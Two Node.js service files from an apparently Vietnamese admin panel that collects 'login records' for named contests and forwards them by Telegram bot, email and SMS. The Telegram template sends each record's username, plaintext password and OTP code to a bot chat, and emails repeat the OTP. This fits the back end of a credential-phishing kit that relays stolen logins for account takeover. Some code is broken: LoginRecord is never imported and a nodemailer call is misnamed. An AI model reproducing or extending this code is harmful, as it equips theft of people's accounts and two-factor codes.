// services/telegramService.js
const axios = require('axios');
const TelegramConfig = require('../models/TelegramConfig');
const ActivityLog = require('../models/ActivityLog');

class TelegramService {
  constructor() {
    this.config = null;
  }

  async loadConfig() {
    this.config = await TelegramConfig.findOne({ isActive: true });
    return this.config;
  }

  async sendMessage(message, options = {}) {
    try {
      if (!this.config) {
        await this.loadConfig();
      }

      if (!this.config) {
        throw new Error('Telegram configuration not found');
      }

      const { botToken, chatId } = this.config;
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...options
      };

      const response = await axios.post(url, payload);

      // Update statistics
      await TelegramConfig.findByIdAndUpdate(this.config._id, {
        $inc: { 'statistics.messagesSent': 1 },
        'statistics.lastMessageSent': new Date()
      });

      return response.data;
    } catch (error) {
      console.error('Telegram send message error:', error);
      
      // Log error
      if (this.config) {
        await TelegramConfig.findByIdAndUpdate(this.config._id, {
          $inc: { 'statistics.errors': 1 },
          'lastError': {
            message: error.message,
            timestamp: new Date()
          }
        });
      }

      throw error;
    }
  }

  async testConnection() {
    try {
      if (!this.config) {
        await this.loadConfig();
      }

      if (!this.config) {
        throw new Error('Telegram configuration not found');
      }

      const { botToken } = this.config;
      const url = `https://api.telegram.org/bot${botToken}/getMe`;

      const response = await axios.get(url);

      // Update last connection test
      await TelegramConfig.findByIdAndUpdate(this.config._id, {
        lastConnectionTest: new Date()
      });

      return {
        success: true,
        botInfo: response.data.result
      };
    } catch (error) {
      console.error('Telegram connection test error:', error);
      
      if (this.config) {
        await TelegramConfig.findByIdAndUpdate(this.config._id, {
          'lastError': {
            message: error.message,
            timestamp: new Date()
          }
        });
      }

      return {
        success: false,
        error: error.message
      };
    }
  }

  async sendLoginRecord(loginRecord, user) {
    try {
      if (!this.config || !this.config.autoSendLogin[loginRecord.status]) {
        return null;
      }

      const template = this.config.messageTemplate.login;
      const message = this.formatLoginMessage(template, loginRecord);

      const result = await this.sendMessage(message);

      // Update login record
      await loginRecord.updateOne({ telegramSent: true });

      // Log activity
      await ActivityLog.create({
        user: user._id,
        action: 'Send Telegram Notification',
        entity: 'LoginRecord',
        entityId: loginRecord._id,
        details: `Sent login notification for ${loginRecord.username}`,
        ipAddress: user.ipAddress || 'system',
        result: 'success'
      });

      return result;
    } catch (error) {
      console.error('Send login record error:', error);
      
      // Log failed activity
      await ActivityLog.create({
        user: user._id,
        action: 'Send Telegram Notification',
        entity: 'LoginRecord',
        entityId: loginRecord._id,
        details: `Failed to send login notification: ${error.message}`,
        ipAddress: user.ipAddress || 'system',
        result: 'failed'
      });

      throw error;
    }
  }

  async sendBulkLoginRecords(loginRecords, user) {
    try {
      const template = this.config.messageTemplate.bulk;
      const stats = this.calculateBulkStats(loginRecords);
      const message = this.formatBulkMessage(template, stats);

      const result = await this.sendMessage(message);

      // Update all records
      const recordIds = loginRecords.map(record => record._id);
      await LoginRecord.updateMany(
        { _id: { $in: recordIds } },
        { telegramSent: true }
      );

      // Log activity
      await ActivityLog.create({
        user: user._id,
        action: 'Send Bulk Telegram Notification',
        entity: 'LoginRecord',
        details: `Sent bulk notification for ${loginRecords.length} records`,
        ipAddress: user.ipAddress || 'system',
        result: 'success'
      });

      return result;
    } catch (error) {
      console.error('Send bulk records error:', error);
      throw error;
    }
  }

  formatLoginMessage(template, loginRecord) {
    const statusIcon = {
      'success': '✅',
      'failed': '❌',
      'pending': '⏳'
    };

    let message = template
      .replace(/{{contestName}}/g, loginRecord.contestName)
      .replace(/{{username}}/g, loginRecord.username)
      .replace(/{{password}}/g, loginRecord.password)
      .replace(/{{otpCode}}/g, loginRecord.otpCode)
      .replace(/{{timestamp}}/g, loginRecord.createdAt.toLocaleString('vi-VN'))
      .replace(/{{ipAddress}}/g, loginRecord.ipAddress)
      .replace(/{{device}}/g, loginRecord.device)
      .replace(/{{status}}/g, this.getStatusText(loginRecord.status))
      .replace(/{{statusIcon}}/g, statusIcon[loginRecord.status] || '❓');

    // Handle conditional location
    if (loginRecord.location && loginRecord.location.city) {
      const location = `${loginRecord.location.city}, ${loginRecord.location.country}`;
      message = message.replace(/{{#if location}}(.+?){{\/if}}/g, `$1`);
      message = message.replace(/{{location}}/g, location);
    } else {
      message = message.replace(/{{#if location}}(.+?){{\/if}}/g, '');
    }

    return message;
  }

  formatBulkMessage(template, stats) {
    return template
      .replace(/{{timestamp}}/g, new Date().toLocaleString('vi-VN'))
      .replace(/{{count}}/g, stats.total)
      .replace(/{{successCount}}/g, stats.success)
      .replace(/{{failedCount}}/g, stats.failed)
      .replace(/{{pendingCount}}/g, stats.pending);
  }

  calculateBulkStats(loginRecords) {
    return {
      total: loginRecords.length,
      success: loginRecords.filter(r => r.status === 'success').length,
      failed: loginRecords.filter(r => r.status === 'failed').length,
      pending: loginRecords.filter(r => r.status === 'pending').length
    };
  }

  getStatusText(status) {
    const statusMap = {
      'success': 'Thành công',
      'failed': 'Thất bại',
      'pending': 'Chờ xử lý'
    };
    return statusMap[status] || status;
  }
}

module.exports = new TelegramService();

// services/notificationService.js
const nodemailer = require('nodemailer');
const twilio = require('twilio');
const SystemNotification = require('../models/SystemNotification');
const User = require('../models/User');
const ActivityLog = require('../models/ActivityLog');

class NotificationService {
  constructor() {
    this.emailTransporter = null;
    this.twilioClient = null;
    this.initializeTransports();
  }

  async initializeTransports() {
    // Initialize email transporter
    this.emailTransporter = nodemailer.createTransporter({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT || 587,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    // Initialize Twilio client
    if (process.env.TWILIO_SID && process.env.TWILIO_TOKEN) {
      this.twilioClient = twilio(process.env.TWILIO_SID, process.env.TWILIO_TOKEN);
    }
  }

  async sendEmail(to, subject, content, options = {}) {
    try {
      if (!this.emailTransporter) {
        throw new Error('Email transporter not configured');
      }

      const mailOptions = {
        from: process.env.FROM_EMAIL || 'noreply@admin.com',
        to,
        subject,
        html: content,
        ...options
      };

      const result = await this.emailTransporter.sendMail(mailOptions);
      return { success: true, messageId: result.messageId };
    } catch (error) {
      console.error('Email send error:', error);
      throw error;
    }
  }

  async sendSMS(to, message) {
    try {
      if (!this.twilioClient) {
        throw new Error('SMS service not configured');
      }

      const result = await this.twilioClient.messages.create({
        body: message,
        from: process.env.TWILIO_PHONE,
        to
      });

      return { success: true, sid: result.sid };
    } catch (error) {
      console.error('SMS send error:', error);
      throw error;
    }
  }

  async sendLoginNotification(loginRecord, user, options = {}) {
    try {
      const notifications = [];

      if (options.email && user.email) {
        const subject = `Thông báo đăng nhập - ${loginRecord.contestName}`;
        const content = this.generateLoginEmailTemplate(loginRecord);
        
        await this.sendEmail(user.email, subject, content);
        notifications.push('email');
      }

      if (options.sms && user.phone) {
        const message = `[${loginRecord.contestName}] Đăng nhập ${this.getStatusText(loginRecord.status)}. Username: ${loginRecord.username}. Thời gian: ${loginRecord.createdAt.toLocaleString('vi-VN')}`;
        
        await this.sendSMS(user.phone, message);
        notifications.push('sms');
      }

      // Update login record
      await loginRecord.updateOne({ notificationSent: true });

      // Log activity
      await ActivityLog.create({
        user: user._id,
        action: 'Send Login Notification',
        entity: 'LoginRecord',
        entityId: loginRecord._id,
        details: `Sent notifications via: ${notifications.join(', ')}`,
        ipAddress: user.ipAddress || 'system',
        result: 'success'
      });

      return { success: true, methods: notifications };
    } catch (error) {
      console.error('Send login notification error:', error);
      throw error;
    }
  }

  async sendBulkNotifications(loginRecords, users, options = {}) {
    try {
      const results = {
        email: { success: 0, failed: 0 },
        sms: { success: 0, failed: 0 }
      };

      for (const record of loginRecords) {
        // Find user associated with the record
        const user = users.find(u => u._id.toString() === record.createdBy.toString());
        if (!user) continue;

        try {
          if (options.email && user.email) {
            const subject = `Thông báo hàng loạt - Hoạt động đăng nhập`;
            const content = this.generateBulkEmailTemplate(loginRecords);
            
            await this.sendEmail(user.email, subject, content);
            results.email.success++;
          }

          if (options.sms && user.phone) {
            const message = `Bạn có ${loginRecords.length} hoạt động đăng nhập mới. Vui lòng kiểm tra hệ thống.`;
            
            await this.sendSMS(user.phone, message);
            results.sms.success++;
          }
        } catch (error) {
          console.error(`Failed to send notification for record ${record._id}:`, error);
          results.email.failed++;
          results.sms.failed++;
        }
      }

      return results;
    } catch (error) {
      console.error('Send bulk notifications error:', error);
      throw error;
    }
  }

  async createSystemNotification(data) {
    try {
      const notification = new SystemNotification(data);
      await notification.save();

      // If it's a critical notification, also send via other channels
      if (data.priority === 'critical') {
        const admins = await User.find({ 
          role: { $in: ['superadmin', 'manager'] },
          status: 'active'
        });

        for (const admin of admins) {
          if (admin.email) {
            await this.sendEmail(
              admin.email,
              `[CRITICAL] ${data.title}`,
              this.generateSystemNotificationEmail(data)
            );
          }
        }
      }

      return notification;
    } catch (error) {
      console.error('Create system notification error:', error);
      throw error;
    }
  }

  generateLoginEmailTemplate(loginRecord) {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #2563eb;">Thông báo đăng nhập</h2>
        <div style="background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3>${loginRecord.contestName}</h3>
          <p><strong>Username:</strong> ${loginRecord.username}</p>
          <p><strong>OTP Code:</strong> ${loginRecord.otpCode}</p>
          <p><strong>Thời gian:</strong> ${loginRecord.createdAt.toLocaleString('vi-VN')}</p>
          <p><strong>IP Address:</strong> ${loginRecord.ipAddress}</p>
          <p><strong>Device:</strong> ${loginRecord.device}</p>
          <p><strong>Trạng thái:</strong> 
            <span style="color: ${loginRecord.status === 'success' ? '#059669' : loginRecord.status === 'failed' ? '#dc2626' : '#d97706'};">
              ${this.getStatusText(loginRecord.status)}
            </span>
          </p>
        </div>
        <p style="color: #6b7280; font-size: 14px;">
          Đây là email tự động từ hệ thống quản lý admin. Vui lòng không trả lời email này.
        </p>
      </div>
    `;
  }

  generateBulkEmailTemplate(loginRecords) {
    const stats = this.calculateStats(loginRecords);
    
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #2563eb;">Báo cáo đăng nhập hàng loạt</h2>
        <div style="background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3>Thống kê tổng quan</h3>
          <p><strong>Tổng số:</strong> ${stats.total}</p>
          <p><strong>Thành công:</strong> <span style="color: #059669;">${stats.success}</span></p>
          <p><strong>Thất bại:</strong> <span style="color: #dc2626;">${stats.failed}</span></p>
          <p><strong>Chờ xử lý:</strong> <span style="color: #d97706;">${stats.pending}</span></p>
          <p><strong>Thời gian:</strong> ${new Date().toLocaleString('vi-VN')}</p>
        </div>
        <p style="color: #6b7280; font-size: 14px;">
          Đây là email tự động từ hệ thống quản lý admin. Vui lòng không trả lời email này.
        </p>
      </div>
    `;
  }

  generateSystemNotificationEmail(notification) {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #dc2626;">[${notification.priority.toUpperCase()}] ${notification.title}</h2>
        <div style="background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>Loại:</strong> ${notification.type}</p>
          <p><strong>Đối tượng:</strong> ${notification.target}</p>
          <p><strong>Thông báo:</strong> ${notification.message}</p>
          <p><strong>Thời gian:</strong> ${notification.createdAt.toLocaleString('vi-VN')}</p>
        </div>
        <p style="color: #6b7280; font-size: 14px;">
          Vui lòng đăng nhập hệ thống để xem chi tiết và xử lý.
        </p>
      </div>
    `;
  }

  calculateStats(loginRecords) {
    return {
      total: loginRecords.length,
      success: loginRecords.filter(r => r.status === 'success').length,
      failed: loginRecords.filter(r => r.status === 'failed').length,
      pending: loginRecords.filter(r => r.status === 'pending').length
    };
  }

  getStatusText(status) {
    const statusMap = {
      'success': 'Thành công',
      'failed': 'Thất bại',
      'pending': 'Chờ xử lý'
    };
    return statusMap[status] || status;
  }
}

module.exports = new NotificationService();